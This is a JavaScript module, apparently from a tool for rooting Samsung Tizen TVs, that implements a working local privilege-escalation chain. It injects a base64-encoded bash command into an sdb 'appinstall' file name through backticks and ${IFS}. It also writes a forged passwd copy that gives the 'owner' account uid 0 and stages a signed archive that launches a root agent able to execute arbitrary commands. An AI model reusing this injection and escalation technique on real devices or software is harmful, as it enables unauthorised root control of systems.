'use strict';

const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const sdb = require('./vendor/sdb');
const { tarGz } = require('./vendor/tar');
const { RootAgentServer } = require('./vendor/root-agent');
const { read, hash, verifyFirmware, sdkRuntimeGuard } = require('./policy');

const BASE = '/home/owner/share/tmp/sdk_tools';
const quote = s => "'" + s.replace(/'/g, "'\\''") + "'";

function launchRequest(stage, gate) {
  const script = 'mkdir ' + quote(gate) + ' 2>/dev/null && { . ' + quote(stage + '/launch-sdk.sh') + '; }';
  const encoded = Buffer.from(script).toString('base64');
  const request = 'shell:0 appinstall tpk new2.tpk`printf${IFS}%s${IFS}' + encoded + '|base64${IFS}-d|bash`.tpk';
  if (Buffer.byteLength(request) > 510) {
    throw new Error('SDK launch command exceeds safe transport limit');
  }
  return request;
}

function createAgent(config, options = {}) {
  let running = false;
  let connected = false;
  let launching = false;
  let timer = null;
  let channel = null;
  let client = null;
  let stage = null;
  let attempts = 0;
  let generation = 0;
  let lastError = null;
  let identity = null;

  const firmware = options.verifyFirmware || verifyFirmware;
  const payload = options.payload || path.join(__dirname, '../payload');

  function diagnostics() {
    const out = {};
    if (stage) {
      for (const n of ['launcher.log', 'root-agent.status', 'root-agent.log']) {
        try {
          out[n] = read(stage + '/' + n, 65536).toString().slice(-2048);
        } catch (_) {}
      }
    }
    return out;
  }

  function status() {
    return {
      schema: 1,
      device: config.device,
      enabled: running,
      connected,
      phase: connected ? 'ready' : launching ? 'acquiring' : running ? 'waiting' : 'disabled',
      attempts,
      last_error: lastError,
      identity,
      diagnostics: diagnostics()
    };
  }

  function clean() {
    if (!stage) return;
    // Remove only known staging artifacts; never recursively delete unknown files.
    for (const n of fs.readdirSync(stage)) {
      if (!/^(SamsungTv(RootAgent|ArchiveRoot)\.(dll|runtimeconfig\.json|deps\.json)|public\.pem|passwd|root-agent\.(token|log|status)|launcher\.log|launch-sdk\.sh)$/.test(n)) {
        continue;
      }
      const p = path.join(stage, n);
      if (fs.lstatSync(p).isFile()) {
        fs.unlinkSync(p);
      }
    }
    try {
      fs.rmdirSync(stage + '/launch-once');
    } catch (_) {}
    const pkg = path.basename(stage);
    for (const suffix of ['.tar.gz', '.tar.gz.signature']) {
      const p = BASE + '/on-demand/' + pkg + suffix;
      if (fs.existsSync(p) && fs.lstatSync(p).isFile()) {
        fs.unlinkSync(p);
      }
    }
    try {
      fs.rmdirSync(stage);
      stage = null;
    } catch (_) {}
    try {
      fs.rmdirSync(BASE + '/on-demand');
    } catch (_) {}
  }

  function schedule() {
    if (!running || timer || connected) return;
    if (attempts >= 8) {
      lastError = 'Acquisition retry budget exhausted; use authenticated disable/enable after diagnosis';
      return;
    }
    timer = setTimeout(() => {
      timer = null;
      launch();
    }, Math.min(60000, 5000 * Math.pow(2, Math.max(0, attempts - 1))));
  }

  function prepare(port, secret) {
    firmware(config);
    const pkg = 'archive-root-' + crypto.randomBytes(8).toString('hex');
    stage = BASE + '/' + pkg;
    fs.mkdirSync(stage, { mode: 0o755 });

    const onDemand = BASE + '/on-demand';
    try {
      fs.mkdirSync(onDemand, { mode: 0o755 });
    } catch (e) {
      if (e.code !== 'EEXIST') throw e;
      const s = fs.lstatSync(onDemand);
      if (!s.isDirectory() || s.isSymbolicLink()) {
        throw new Error('Unsafe staging directory');
      }
    }

    const manifest = JSON.parse(read(payload + '/manifest.json'));
    for (const name of ['SamsungTvArchiveRoot', 'SamsungTvRootAgent']) {
      for (const suffix of ['dll', 'runtimeconfig.json', 'deps.json']) {
        const file = name + '.' + suffix;
        const bytes = read(payload + '/' + file, 4 * 1024 * 1024);
        if (hash(bytes) !== manifest[file]) {
          throw new Error('Payload mismatch');
        }
        fs.writeFileSync(stage + '/' + file, bytes, { mode: 0o644, flag: 'wx' });
      }
    }

    const keys = crypto.generateKeyPairSync('rsa', { modulusLength: 2048 });
    fs.writeFileSync(stage + '/public.pem', keys.publicKey.export({ type: 'spki', format: 'pem' }), { mode: 0o644, flag: 'wx' });

    const passwd = read('/etc/passwd').toString().split('\n');
    let changed = 0;
    const view = passwd
      .map(line => {
        const parts = line.split(':');
        if (parts[0] === 'owner') {
          if (parts.length !== 7 || parts[2] !== '5001') {
            throw new Error('Unexpected owner identity');
          }
          parts[2] = '0';
          parts[3] = '0';
          changed++;
          return parts.join(':');
        }
        return line;
      })
      .join('\n');
    if (changed !== 1) {
      throw new Error('Missing owner identity');
    }
    fs.writeFileSync(stage + '/passwd', view, { mode: 0o644, flag: 'wx' });
    fs.writeFileSync(stage + '/root-agent.token', secret.toString('base64') + '\n', { mode: 0o600, flag: 'wx' });

    const script =
      '/usr/bin/dotnet ' +
      stage +
      '/SamsungTvRootAgent.dll 127.0.0.1 ' +
      port +
      ' ' +
      stage +
      '/root-agent.token ' +
      stage +
      ' </dev/null >' +
      stage +
      '/root-agent.log 2>&1 &\n';
    const archive = tarGz([{ name: 'launch.sh', data: script, mode: 0o700 }]);
    fs.writeFileSync(onDemand + '/' + pkg + '.tar.gz', archive, { mode: 0o644, flag: 'wx' });
    fs.writeFileSync(onDemand + '/' + pkg + '.tar.gz.signature', crypto.sign('RSA-SHA256', archive, keys.privateKey), { mode: 0o644, flag: 'wx' });
    return pkg;
  }

  async function launch() {
    if (!running || connected || launching) return;
    launching = true;
    attempts++;
    const gen = ++generation;
    let step = 'firmware verification';
    try {
      firmware(config);
      const secret = crypto.randomBytes(32);
      if (channel) channel.close();
      channel = new RootAgentServer({
        secret,
        onConnect: conn => {
          if (!running || gen !== generation) {
            conn._socket.destroy();
            return;
          }
          connected = true;
          identity = conn.identity;
          lastError = null;
          launching = false;
          if (timer) {
            clearTimeout(timer);
            timer = null;
          }
          if (client) {
            sdb.close(client);
            client = null;
          }
        },
        onClose: () => {
          if (gen !== generation) return;
          connected = false;
          identity = null;
          schedule();
        }
      });

      await new Promise((resolve, reject) => {
        channel.start(resolve);
        channel._server.once('error', reject);
      });
      if (!running || gen !== generation) return;

      step = 'loopback connection';
      const opened = await sdb.connect({ host: '127.0.0.1', port: 26101, timeout: 8000 });
      if (!running || gen !== generation) {
        sdb.close(opened);
        return;
      }
      client = opened;

      step = 'payload staging';
      clean();
      const pkg = prepare(channel.listeningPort(), secret);
      const command = '/usr/bin/dotnet ' + quote(stage + '/SamsungTvArchiveRoot.dll') + ' ' + quote(pkg);
      // SDK UID 901 cannot create a marker in the app-owned staging directory.
      const gate = '/tmp/' + pkg + '-launch-once';
      fs.writeFileSync(stage + '/launch-sdk.sh', 'set -eu\n' + sdkRuntimeGuard(config) + command + '\n', { mode: 0o644, flag: 'wx' });

      step = 'SDK launcher';
      const output = await sdb.exec(client, launchRequest(stage, gate), { timeout: 30000 });
      if (!connected && output) {
        lastError = 'SDK launcher: ' + output.slice(-300).replace(/[\r\n]+/g, ' ');
      }
      if (!connected && running && gen === generation) {
        throw new Error(lastError && lastError.startsWith('SDK launcher:') ? lastError : 'Launcher returned without authenticated agent');
      }
    } catch (e) {
      if (running && gen === generation && !connected) {
        lastError = (step + ': ' + String(e.message || e.code)).slice(0, 300);
      }
    } finally {
      if (gen === generation) {
        launching = false;
        if (client) {
          sdb.close(client);
          client = null;
        }
        if (!connected) schedule();
      }
    }
  }

  function start() {
    if (running) return;
    running = true;
    attempts = 0;
    lastError = null;
    launch();
  }

  function stop() {
    running = false;
    connected = false;
    identity = null;
    ++generation;
    if (timer) clearTimeout(timer);
    timer = null;
    if (client) sdb.close(client);
    client = null;
    if (channel) channel.close();
    channel = null;
    launching = false;
    const stopped = generation;
    setTimeout(() => {
      if (!running && generation === stopped) {
        try {
          clean();
        } catch (_) {
          lastError = 'Staging cleanup incomplete';
        }
      }
    }, 1000);
  }

  return {
    status,
    start,
    stop,
    execute: (command, timeout) => {
      if (!running || !connected || !channel) {
        return Promise.reject(new Error('Root agent unavailable'));
      }
      return channel.execute(command, timeout);
    }
  };
}

module.exports = { createAgent, launchRequest };
